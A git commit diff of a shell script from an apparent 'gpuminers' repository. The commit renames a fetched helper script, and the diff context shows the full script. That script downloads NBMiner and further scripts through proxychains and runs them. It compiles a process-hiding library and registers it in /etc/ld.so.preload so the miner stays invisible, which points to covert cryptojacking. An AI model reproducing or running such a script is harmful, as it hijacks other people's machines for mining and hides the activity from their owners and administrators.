610e106987e9efef73b3f09cec7ec9e2f47c749e
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-02-02 16:29:25 +0200

    Update start_nbEthermMandy.sh

--- start_nbEthermMandy.sh
+++ start_nbEthermMandy.sh
@@ -3,12 +3,12 @@ proxychains curl ifconfig.me
 proxychains wget https://github.com/NebuTech/NBMiner/releases/download/v36.1/NBMiner_36.1_Linux.tgz
 tar -xvzf NBMiner_36.1_Linux.tgz
 cd NBMiner_Linux
-proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/nbEthermineMandie.sh
-chmod +x nbEthermineMandie.sh
+proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/nbEthermMandie.sh
+chmod +x nbEthermMandie.sh
 proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
 unzip magicNb.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-./nbEthermineMandie.sh
+./nbEthermMandie.sh
